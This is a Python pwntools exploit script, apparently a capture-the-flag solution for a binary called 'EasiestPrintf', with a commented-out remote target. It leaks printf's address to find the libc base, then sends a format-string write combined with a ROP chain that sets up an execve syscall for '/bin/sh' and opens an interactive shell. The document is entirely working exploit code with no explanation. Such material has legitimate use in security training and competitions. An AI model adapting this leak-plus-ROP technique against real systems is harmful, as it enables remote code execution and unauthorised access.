from pwn import *
import sys
import os

io = process('./EasiestPrintf') 
#io = remote('202.120.7.210', 12321)
context.log_level = 'debug'
pause()

io.recvuntil(':')
io.sendline(str(0x8049fc8))

io.recvuntil('0x')
printf_addr = int('0x' + io.recvuntil('\n')[:-1], 16)
log.info('printf_addr :' + hex(printf_addr))
libc_main = printf_addr - 303408
mmaped_addr = libc_main - (0xf752b000 - 0xf752a950)
print hex(printf_addr - 303408)
#mmaped_addr = printf_addr - 0x4cc70 - (0xf752b000 - 0xf752a950)

io.recvuntil('\n')
write_1 = libc_main + 0x00064a70 
payload = 'AAAAAAAAAAAAAAAA'
payload += p32(libc_main + 0x001463b7) ## xor edx, edx ; pop esi ; pop edi ; ret
payload += p32(0x001b7048 + libc_main) ##esi
payload += p32(0x41414141)
payload += p32(0x00069ef6 + libc_main) ## mov dword ptr [esi], edx ; pop esi ; ret
payload += p32(0x41414141)
payload += p32(0x0001848e + libc_main) ## pop ebx; ret 
payload += p32(libc_main + 1439195) ## binsh
payload += p32(libc_main + 0x000b83a7) ## pop ecx; ret
payload += p32(libc_main + 0x001b7048) ## data + 8
payload += p32(libc_main + 0x00001aa6) ## pop edx; ret
payload += p32(libc_main + 0x001b7048) ## data + 8
payload += p32(libc_main + 0x0002ca4c) ## xor eax
payload += p32(libc_main + 0x00142f50) ## add eax 5
payload += p32(libc_main + 0x00142f50) ## add eax 5
payload += p32(libc_main + 0x000063c8)
payload += p32(libc_main + 0x0002c0f5) ## int 80
payload += fmtstr_payload(7 + len(payload)/4, {mmaped_addr: write_1}, len(payload), write_size='byte')
io.sendline(payload)
io.interactive()
